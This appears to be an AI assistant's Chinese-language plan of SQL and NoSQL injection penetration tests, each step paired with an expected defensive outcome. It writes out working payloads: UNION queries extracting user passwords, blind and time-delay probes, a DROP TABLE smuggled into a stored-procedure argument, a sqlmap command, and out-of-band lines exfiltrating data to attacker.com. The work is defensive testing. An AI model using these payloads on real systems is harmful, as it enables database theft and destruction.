以下是为**SQL注入测试**设计的全面渗透测试用例，严格遵循您要求的格式（测试步骤与期望结果一一对应），覆盖多种注入技术和场景：

---

### **测试用例1：基础错误型注入检测**
**测试步骤**  
[1] 在URL参数值后添加单引号：`?id=1'`  
[2] 添加注释符测试：`?id=1'--`  
[3] 尝试逻辑操作：`?id=1' OR 1=1--`  
[4] 故意触发类型错误：`?id=string'`（原应为数字）  
[5] 组合特殊字符：`?id=1'; WAITFOR DELAY '0:0:5'--`  

**期望结果**  
[1] 返回通用错误页（不显示数据库错误详情）  
[2] 系统行为无变化（注释符被过滤）  
[3] 返回空数据集或默认首页（未返回全部数据）  
[4] 返回"参数类型错误"提示（强类型校验）  
[5] 响应时间无延迟（时间函数被禁用）  

---

### **测试用例2：联合查询注入攻击**
**测试步骤**  
[1] 探测列数：`?id=1' ORDER BY 10--`  
[2] 确定显示位：`?id=-1' UNION SELECT 1,2,3--`  
[3] 获取数据库信息：`?id=-1' UNION SELECT @@version,user(),database()--`  
[4] 提取表名：`?id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables--`  
[5] 盗取凭据：`?id=-1' UNION SELECT 1,username,password FROM users--`  

**期望结果**  
[1] 列数超出时报错（不泄露实际列数）  
[2] 联合查询被拦截（WAF日志告警）  
[3] 系统函数返回空值（信息屏蔽）  
[4] 信息模式访问被拒绝（权限控制）  
[5] 敏感表名无法猜测（表名随机化）  

---

### **测试用例3：布尔盲注检测**
**测试步骤**  
[1] 真条件测试：`?id=1' AND 1=1--`  
[2] 假条件测试：`?id=1' AND 1=2--`  
[3] 逐字符猜解：`?id=1' AND SUBSTRING(@@version,1,1)='M'--`  
[4] 条件响应测试：`?id=1' AND IF(1=1,SLEEP(5),0)--`  
[5] 错误计数检测：多次发送非常规参数观察错误率  

**期望结果**  
[1] 返回相同内容（混淆真/假状态）  
[2] 页面无变化（阻止状态推断）  
[3] 统一返回默认数据集（防数据泄露）  
[4] 响应时间恒定（添加随机延迟）  
[5] 错误阈值触发账户锁定（安全机制）  

---

### **测试用例4：时间盲注攻击**
**测试步骤**  
[1] 基础延时测试：`?id=1'; WAITFOR DELAY '0:0:5'--`  
[2] 条件延时：`?id=1' IF(SYSTEM_USER='sa') WAITFOR DELAY '0:0:3'--`  
[3] DNS带外泄露：`?id=1'; DECLARE @q varchar(1024);SET @q='\\'+CONVERT(varchar(50),@@version)+'.attacker.com'; EXEC master..xp_dirtree @q;--`  
[4] HTTP带外泄露：`?id=1'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\'))--`  

**期望结果**  
[1] 立即响应（延时函数禁用）  
[2] 无时间差异（请求队列化处理）  
[3] 外连请求被防火墙阻断  
[4] 文件读取函数权限被回收  

---

### **测试用例5：二阶注入与存储过程**
**测试步骤**  
[1] 注册含注入的用户名：`admin'--`  
[2] 密码修改时触发：使用该账号请求修改密码  
[3] 调用含注入的存储过程：`EXEC sp_searchProducts @query = ''; DROP TABLE orders--'`  
[4] XML注入：`?id=1' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--`  

**期望结果**  
[1] 特殊字符被转义存储（`admin\'--`）  
[2] 修改操作失败（参数化查询）  
[3] 存储过程执行错误（动态SQL禁用）  
[4] XML解析错误被捕获（安全处理）  

---

### **测试用例6：NoSQL注入检测**
**测试步骤**  
[1] MongoDB注入：`{"$where":"1==1"}`  
[2] 布尔绕过：`?username=admin' || '1'=='1`  
[3] JSON注入：`{"id":{"$ne":-1}}`  
[4] 运算符注入：`?age[$gt]=0`  

**期望结果**  
[1] 返回空结果（查询执行器加固）  
[2] 返回权限错误（上下文感知）  
[3] 返回默认数据集（结果限制）  
[4] 运算符被过滤（输入白名单）  

---

### **测试用例7：自动化工具对抗**
**测试步骤**  
[1] 使用sqlmap扫描：`sqlmap -u "http://site.com?id=1" --risk=3`  
[2] 载荷模糊测试：发送100+变种注入字符串  
[3] 分块传输攻击：`Transfer-Encoding: chunked`  
[4] 编码绕过尝试：`?id=1%27%20AND%201%3D1%20--`  

**期望结果**  
[1] 工具被阻断（WAF指纹识别）  
[2] 异常请求率触发限流  
[3] 非常规协议返回400错误  
[4] URL解码后仍被过滤  

---

### **防御验证矩阵**
```markdown
| 防护层         | 测试方法                     | 有效标志                     |
|----------------|----------------------------|----------------------------|
| 输入验证       | 发送`<script>`标签          | 返回"非法字符"错误          |
| 参数化查询     | 监控SQL执行计划             | 无动态拼接语句              |
| 最小权限       | 尝试`xp_cmdshell`           | 返回"权限不足"              |
| 错误处理       | 触发除零错误`1/0`           | 返回通用错误页              |
| WAF            | 发送`UNION SELECT`          | 触发406拦截页面             |
| 速率限制       | 每秒发送20+请求             | 触发验证码或临时封禁        |
```

> **高级防护建议**  
> 1. **深度防御**：应用层+数据库层+网络层联合防护  
> 2. **运行时保护**：使用RASP监控SQL执行行为  
> 3. **虚假数据**：对非常规查询返回诱饵数据  
> 4. **密钥轮换**：定期更换数据库加密凭证  
> 5. **威胁狩猎**：分析SQL日志中的攻击模式  

每个测试用例都可扩展为具体测试方案，实际执行时应结合应用架构调整攻击载荷和检测点。